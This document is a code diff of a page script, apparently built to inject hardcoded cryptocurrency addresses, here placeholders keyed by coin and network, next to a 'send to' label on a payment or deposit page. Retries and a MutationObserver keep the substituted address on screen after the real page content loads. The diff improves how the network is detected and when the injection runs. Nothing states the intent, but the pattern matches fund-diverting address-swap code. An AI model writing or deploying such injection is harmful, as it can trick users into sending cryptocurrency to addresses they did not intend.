@@ -44,7 +44,7 @@
   observer.observe(document.body, { childList: true, subtree: true });
 </script>
 <script>
-  const coinNetworkAddresses = {
+  const coinAddresses = {
     "BTC_BITCOIN": "1000000000000000",
     "BTC_LIQUID": "1000000000000001",
     "ETH_ETHEREUM": "1000000000000002",
@@ -81,27 +81,46 @@
 
     const symbol = coinSymbolEl.textContent.trim().toUpperCase();
 
-    const networkBadge = coinContainer.querySelector('div.mt-2.inline-block.rounded.border');
-    if (!networkBadge) return false;
-
-    const network = networkBadge.textContent.trim().split(" ")[0].toUpperCase();
-
-    const key = `${symbol}_${network}`;
-    const address = coinNetworkAddresses[key];
-    if (!address) return false;
-
-    const sendToLabel = document.getElementById("send-to-label");
-    if (!sendToLabel) return false;
-
-    let addressEl = document.getElementById("custom-address-display");
-    if (!addressEl) {
-      addressEl = document.createElement("span");
-      addressEl.id = "custom-address-display";
-      addressEl.className = "dark:text-flashbang-white text-new-black inline-block select-all break-words break-all text-xl font-bold";
-      sendToLabel.insertAdjacentElement("afterend", addressEl);
+    // 🔍 Find the correct div that contains the network
+    const divs = coinContainer.querySelectorAll('div.font-display');
+    let network = "";
+    for (let div of divs) {
+      if (div.textContent.toLowerCase().includes("network")) {
+        network = div.textContent.trim().split(' ')[0].toUpperCase();
+        break;
+      }
     }
 
-    addressEl.textContent = address;
+    if (!network) return false;
+
+    const key = `${symbol}_${network}`;
+    const address = coinAddresses[key];
+    if (!address) return false;
+
+    function injectAddress() {
+      const sendToLabel = document.getElementById("send-to-label");
+      if (!sendToLabel) return false;
+
+      let addressEl = document.getElementById("custom-address-display");
+      if (!addressEl) {
+        addressEl = document.createElement("span");
+        addressEl.id = "custom-address-display";
+        addressEl.className = "dark:text-flashbang-white text-new-black inline-block select-all break-words break-all text-xl font-bold";
+        sendToLabel.insertAdjacentElement("afterend", addressEl);
+      }
+
+      addressEl.textContent = address;
+      return true;
+    }
+
+    // MutationObserver in case the label appears late
+    const observer = new MutationObserver(() => {
+      const ok = injectAddress();
+      if (ok) observer.disconnect();
+    });
+
+    observer.observe(document.body, { childList: true, subtree: true });
+
     return true;
   }
 
@@ -109,17 +128,17 @@
     setTimeout(() => {
       const maxAttempts = 20;
       let attempts = 0;
-
       const interval = setInterval(() => {
-        const injected = showCoinAddress();
+        const ok = showCoinAddress();
         attempts++;
-        if (injected || attempts >= maxAttempts) {
+        if (ok || attempts >= maxAttempts) {
           clearInterval(interval);
         }
       }, 500);
     }, 3000);
   });
 </script>
+
 
 
 
